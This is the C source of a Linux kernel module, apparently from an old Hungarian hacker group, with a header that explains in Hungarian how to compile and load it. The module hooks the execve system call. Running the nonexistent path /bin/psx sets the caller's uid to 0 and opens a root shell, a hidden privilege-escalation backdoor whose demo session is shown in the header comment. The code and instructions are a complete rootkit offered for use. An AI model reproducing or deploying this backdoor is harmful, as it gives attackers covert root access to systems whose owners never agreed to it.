/***************************************************** 
* WooDoo Hacker Crew Bemutatja:                      *
* "Variaciok egy hackelt kernelmodulra"              *
*               Elso resz - A nemletezo suid shell   *
******************************************************
* A modul az execv kernelhivast irja at egy "picit", *
* egy megadott parancssorra ad egy r00tshellt, de az *
* inditott program persze nem is letezik :)))        *
******************************************************
* crow@TheCrow[~]$ ls -l /bin/psx                    *
* ls: /bin/psx: No such file or directory            * 
* crow@TheCrow[~]$ /bin/psx                          *
* root@TheCrow[~]#                                   *
******************************************************
* Forditas: "gcc ide.c -c" v. ha tobb proci van      *
* "gcc ide.c -c -D__SMP__"                           *
* Utana: "insmod ide" , aztan had szoljon :)         *  
******************************************************
* Szereplok:                                         *
*       Kod: SMiL es Cr0W                            *
*   Alapelv: Perly                                   *
*       SMP: C-GRiNDeR                               *
*     Teszt: Pc2, ubul, kewl + ???:)                 *
*****************************************************/                                   

#define MODULE
#define __KERNEL__
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/unistd.h>
#include <sys/syscall.h>
#include <linux/mm.h>
#include <linux/smp_lock.h>
#include <asm/ptrace.h>
#include <errno.h>
#include <string.h>

int (*orig_execve)(struct pt_regs); // beka'phoz kell.
void execve_log(char *, char **);

extern void *sys_call_table[];


int megbaszott_execve(struct pt_regs regs)
{
   int error;
   char * filename;

 
   lock_kernel(); // lock, amig tamperolunk
  
   filename = getname((char *) regs.ebx); // EBX regbol a filenev

   // Ha /bin/psx a filenev, amit a program inditani akar:
   if ( strstr(filename, "/bin/psx")) {
        current->uid = 0 ; // Whopsz :)
        do_execve("/bin/sh", (char **) regs.ecx, (char **) regs.edx, &regs);  
      }

   // Sztandard execve hibakezeles - a kernel/sys.c-bol kicsenve
   error = PTR_ERR(filename);

   if (IS_ERR(filename))
      goto out;

 error = do_execve(filename, (char **) regs.ecx, (char **) regs.edx, &regs);
   if (error == 0)
      current->flags &= ~PF_DTRACE;

   putname(filename);

out:
   unlock_kernel(); // unlock
   return error;  //  Visszaadjuk a vezerlest, bye-bye :)
}

int init_module(void)
{
   orig_execve = sys_call_table[SYS_execve]; // Beka'p.
   sys_call_table[SYS_execve] = megbaszott_execve; // ici-pici hekk
   return(0);
}

void cleanup_module(void)
{
   sys_call_table[SYS_execve] = orig_execve; // Resztor. 
}